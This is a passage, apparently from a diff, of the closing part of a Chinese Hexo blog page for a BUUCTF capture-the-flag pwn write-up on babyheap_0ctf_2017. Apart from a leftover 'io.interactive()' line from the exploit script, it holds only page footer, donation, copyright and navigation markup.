+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>​                                                                                                                                                                                                            </p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wx.jpg" alt="da1sy 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/zhifubao.jpg" alt="da1sy 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>da1sy
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://example.com/2024/08/19/buuctf-pwn%E2%80%94%E2%80%94babyheap-0ctf-2017/" title="[BUUCTF]PWN——babyheap_0ctf_2017">https://example.com/2024/08/19/buuctf-pwn——babyheap-0ctf-2017/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/heap/" rel="tag"># Heap</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/19/tcache-attack%E7%9A%84%E5%AD%A6%E4%B9%A0/" rel="prev" title="Tcache_attack的学习">
+                  <i class="fa fa-angle-left"></i> Tcache_attack的学习
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">da1sy</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">10k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">9 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
